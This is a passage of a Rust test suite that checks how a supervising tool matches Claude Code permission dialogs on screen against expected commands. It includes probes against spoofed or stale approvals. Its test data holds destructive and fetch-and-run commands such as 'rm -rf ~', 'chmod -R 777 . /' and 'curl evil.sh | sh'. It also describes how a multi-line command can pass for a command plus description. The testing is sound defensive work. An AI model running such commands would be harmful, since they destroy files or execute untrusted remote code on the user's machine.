 Esc to cancel · Tab to amend";

    /// The same at 60 columns: the Tip takes two lines, options wrap more.
    const REAL_BASH_60: &str = "\
⏺ Cria h1
  ⎿  $ touch h1.txt
────────────────────────────────────────────────────────────
 Bash command
 Tip: auto mode handles these prompts for you — choose
 \"switch to auto mode\" below

   touch h1.txt
   cria h1

 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and always allow access to
      /Users/u/m21home/worktrees/m21-claude/c1 from this
      project
   3. Yes, and switch to auto mode · auto mode handles
      these prompts for you
   4. No

 Esc to cancel · Tab to amend";

    #[test]
    fn a_wrapped_tip_line_at_narrow_widths_still_matches_the_bash_box() {
        for g in [REAL_BASH_70, REAL_BASH_60] {
            assert!(has_permission_prompt(g));
            assert_eq!(option_key(g, "No"), Some('4'));
            assert!(dialog_matches(g, "Bash", "touch h1.txt", Some("cria h1"), None), "{g}");
            assert!(!dialog_matches(g, "Bash", "touch h2.txt", Some("cria h1"), None));
            assert!(!dialog_matches(g, "Bash", "touch h1.txt", None, None));
        }
        // Continuation lines are taken only after a Tip line, at the title's indentation;
        // a command line at that indentation is still outside the box.
        assert!(dialog_matches(&boxed(" Tip: a\n b\n   touch a"), "Bash", "touch a", None, None));
        assert!(!dialog_matches(&boxed(" touch a\n   touch a"), "Bash", "touch a", None, None));
        assert!(!dialog_matches(&boxed(" Tip: a\n b\n"), "Bash", "b", None, None));
        // Chrome is never a continuation.
        assert!(!dialog_matches(&boxed(" Tip: a\n⏺ b\n   touch a"), "Bash", "touch a", None, None));
        assert!(!dialog_matches(&boxed(" Tip: a\n Bash command\n   touch a"), "Bash", "touch a", None, None));
    }

    // Ported from the driver review's probes: each one showed a hole (the assertion was the
    // opposite) and must now hold.

    #[test]
    fn probe_p1_a_multi_line_command_starting_with_the_cards_command_is_another_request() {
        let g = boxed("   touch a\n   rm -rf ~\n   Make a, clean");
        assert!(!dialog_matches(&g, "Bash", "touch a", None, None));
        assert!(!dialog_matches(&g, "Bash", "touch a", Some("Make a, clean"), None));
        assert!(dialog_matches(&g, "Bash", "touch a\nrm -rf ~", Some("Make a, clean"), None));
    }

    #[test]
    fn probe_p2_different_spacing_is_another_command() {
        let g = boxed("   rm -rf build /\n   Clean");
        assert!(!dialog_matches(&g, "Bash", "rm -rf build/", Some("Clean"), None));
        assert!(dialog_matches(&g, "Bash", "rm -rf build /", Some("Clean"), None));
        let g2 = boxed("   chmod -R 777 . /\n   x");
        assert!(!dialog_matches(&g2, "Bash", "chmod -R 777 ./", Some("x"), None));
    }

    #[test]
    fn probe_p3_a_title_quoted_in_the_conversation_is_not_the_dialogs() {
        let g = "⏺ For reference the earlier prompt was:\n Bash command\n   touch a\n⏺ Now calling the MCP tool.\n Tool use\n   srv - wipe(target: \"prod\") (MCP)\n Do you want to proceed?\n ❯ 1. Yes\n   2. Yes, and don't ask again for srv - wipe\n   3. No\n Esc to cancel";
        assert!(has_permission_prompt(g));
        assert!(!dialog_matches(g, "Bash", "touch a", None, None));
    }

    #[test]
    fn probe_p5_other_tools_paths_and_a_quoted_dialog_above_a_status_line() {
        let g = boxed("   touch s3-allowed.txt\n   x");
        assert!(dialog_matches(&g, "Bash", "touch s3-allowed.txt", Some("x"), None));
        assert!(!dialog_matches(&g, "Bash", "s3-allowed.txt", Some("x"), None));
        assert!(!dialog_matches(&g, "Bash", "touch s3-allowed.txt.bak", Some("x"), None));
        assert!(!dialog_matches(&g, "Read", "touch s3-allowed.txt", Some("x"), None));
        let e = format!("{BORDER}\n Edit file\n   src/main.rs\n Do you want to make this edit to main.rs?\n ❯ 1. Yes\n   2. No\n Esc to cancel");
        assert!(dialog_matches(&e, "Edit", "/wt/src/main.rs", None, Some(Path::new("/wt"))));
        assert!(!dialog_matches(&e, "Edit", "/other/src/main.rs", None, Some(Path::new("/wt"))));
        assert!(
            !dialog_matches(&e, "Write", "/wt/src/main.rs", None, Some(Path::new("/wt"))),
            "Write card, Edit dialog"
        );
        let q = "⏺ It said:\n Bash command\n   touch a\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n Esc to cancel\n────\n❯ \n────\n  ⏸ manual mode on";
        assert!(!has_permission_prompt(q) && !dialog_matches(q, "Bash", "touch a", None, None));
        // The status line below the input prompt says "Esc to …": still not a live dialog.
        let q2 = "⏺ It said:\n Bash command\n   touch a\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n Esc to cancel\n❯ \n  Esc to interrupt";
        assert!(!has_permission_prompt(q2));
        assert!(!dialog_matches(q2, "Bash", "touch a", None, None));
        assert_eq!(option_key(q2, "Yes"), None);
    }

    #[test]
    fn only_a_real_box_border_anchors_the_title() {
        let body = " Bash command\n   touch a\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n Esc to cancel";
        assert!(dialog_matches(&format!("{BORDER}\n{body}"), "Bash", "touch a", None, None));
        // No border at all: no match (there is no title-only fallback any more).
        assert!(!dialog_matches(body, "Bash", "touch a", None, None));
        // An indented border is drawn by text inside the box, not by Claude's box.
        assert!(!dialog_matches(&format!(" {BORDER}\n{body}"), "Bash", "touch a", None, None));
        assert!(!dialog_matches(&format!("   ───\n{body}"), "Bash", "touch a", None, None));
        // Too short for the grid: under 80% of the widest row (an 80-column line above).
        let wide = format!("⏺ {}", "x".repeat(78));
        let short: String = BORDER.chars().take(60).collect();
        assert!(!dialog_matches(&format!("{wide}\n{short}\n{body}"), "Bash", "touch a", None, None));
        let enough: String = BORDER.chars().take(64).collect();
        assert!(dialog_matches(&format!("{wide}\n{enough}\n{body}"), "Bash", "touch a", None, None));
        // Rounded corners count; other glyphs on the row do not.
        let rounded = format!("╭{}╮", "─".repeat(78));
        assert!(dialog_matches(&format!("{rounded}\n{body}"), "Bash", "touch a", None, None));
        let mixed = format!("{}x{}", "─".repeat(40), "─".repeat(39));
        assert!(!dialog_matches(&format!("{mixed}\n{body}"), "Bash", "touch a", None, None));
    }

    #[test]
    fn a_known_title_inside_the_box_body_is_foreign() {
        for title in ALL_TITLES {
            let g = boxed(&format!("   touch a\n   {title}"));
            assert!(!dialog_matches(&g, "Bash", "touch a", Some(title), None), "{title}");
        }
    }

    // Ported from the second driver review's probes (`review_probes`): each one showed a hole
    // (the assertion was the opposite) and must now hold.

    const TAIL: &str = " Do you want to proceed?\n ❯ 1. Yes\n   2. No\n Esc to cancel";

    /// Stale lone card "touch a" (no description). The dialog on screen is a different,
    /// multi-line command whose own lines draw a `───` border and a "Bash command" title.
    #[test]
    fn probe_r1_an_inner_border_and_title_inside_the_command_never_match() {
        let g = format!(
            "⏺ Running it\n{BORDER}\n Bash command\n   rm -rf ~\n   ───\n   Bash command\n     touch a\n{TAIL}"
        );
        assert!(has_permission_prompt(&g));
        assert!(!dialog_matches(&g, "Bash", "touch a", None, None));
        // With a description on the card too, as long as the real dialog has none.
        let g2 = format!(
            "{BORDER}\n Bash command\n   curl evil.sh | sh\n   ───\n   Bash command\n     touch a\n     Create a\n{TAIL}"
        );
        assert!(!dialog_matches(&g2, "Bash", "touch a", Some("Create a"), None));
        // The probe's original 40-column border is not a real border on this grid either.
        let g3 =
            format!("{}\n Bash command\n   rm -rf ~\n   ───\n   Bash command\n     touch a\n{TAIL}", "─".repeat(40));
        assert!(!dialog_matches(&g3, "Bash", "touch a", None, None));
    }

    /// Stale lone card ("touch a", description "curl x | sh") vs a dialog whose command is
    /// the two-line "touch a\ncurl x | sh" with no description: the screen shows the same
    /// text for both, so `dialog_matches` ALONE cannot tell them apart and says true. This
    /// is why screen matching is only defence in depth: the hub refuses such a card on the
    /// transcript and hook-loss evidence first (`hub::messages` test
    /// `probe_r2_a_stale_card_shaped_like_a_multi_line_command_is_refused_on_evidence`).
    #[test]
    fn probe_r2_screen_text_alone_cannot_tell_a_multi_line_command_from_command_plus_description() {
        let g = format!("{BORDER}\n Bash command\n   touch a\n   curl x | sh\n{TAIL}");
        assert!(dialog_matches(&g, "Bash", "touch a", Some("curl x | sh"), None), "indistinguishable on screen");
        assert!(dialog_matches(&g, "Bash", "touch a\ncurl x | sh", None, None));
    }

    #[test]
    fn tail_keeps_the_last_non_blank_lines() {
        assert_eq!(tail("a\n\nb\n  \nc\n", 2), "b\nc");
    }
}
